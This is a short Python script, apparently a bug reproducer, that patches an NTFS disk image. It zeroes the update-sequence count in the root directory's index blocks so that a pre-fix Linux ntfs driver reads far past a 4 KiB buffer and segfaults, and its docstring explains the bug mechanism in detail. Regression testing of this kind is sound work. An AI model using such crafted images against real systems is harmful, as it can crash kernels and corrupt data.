#!/usr/bin/env python3
"""Set usa_count = 0 on every INDX block of the root directory's $I30
$INDEX_ALLOCATION.

Why this exists: upstream 5b6eedd7cc29 moves post_write_mst_fixup()
from ntfs_icx_ib_sync_write() into ntfs_ib_write(), so a block whose
pre_write_mst_fixup() validation fails never reaches post_write.
Before the fix, ntfs_ib_write() returned -EIO for the invalid block
and the caller ran post_write_mst_fixup() on it anyway; post_write
assumes the block is valid and does no boundary checks. With
usa_count = 0 the count underflows to 0xffff and post_write walks
~33 MB past the 4 KiB buffer, a deterministic segfault.

The crafted block still reads fine: post_read_mst_fixup() treats an
invalid USA as "not protected" and returns 0 without touching the
buffer, so the directory loads and a create + fsync reaches the sync
write. Only the header bytes 6-7 (usa_count) are changed; the sector
ends are untouched, so no fixup handling is needed.

usage: patch_ib_usa.py IMG
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from patch_reparse import Vol, fixup_undo, u16, u32

AT_INDEX_ALLOCATION = 0xA0


def main():
    img = sys.argv[1]
    vol = Vol(img)
    rec, off = vol.read_mft_raw(5)
    rec = bytearray(rec)
    fixup_undo(rec, vol.bps)
    assert rec[:4] == b"FILE", "record 5 is not an MFT record"

    patched = 0
    for o, t, l in vol.attrs(rec):
        if t != AT_INDEX_ALLOCATION:
            continue
        assert rec[o + 8], "$INDEX_ALLOCATION $I30 is resident"
        runs = vol.runlist_of((rec, off), AT_INDEX_ALLOCATION, undone=True)
        for vcn, lcn, length in runs:
            for i in range(length):
                blk_off = (lcn + i) * vol.cs
                vol.f.seek(blk_off)
                blk = bytearray(vol.f.read(vol.idx_blk))
                if blk[:4] != b"INDX":
                    raise RuntimeError("index block at %d is not INDX" % blk_off)
                old = u16(blk, 6)
                struct.pack_into("<H", blk, 6, 0)
                vol.f.seek(blk_off)
                vol.f.write(blk)
                print("patched INDX block @%d: usa_count %d -> 0" % (blk_off, old))
                patched += 1
    vol.f.close()
    assert patched, "no INDX block found in root $INDEX_ALLOCATION"
    print("patched %d INDX block(s)" % patched)


if __name__ == "__main__":
    main()
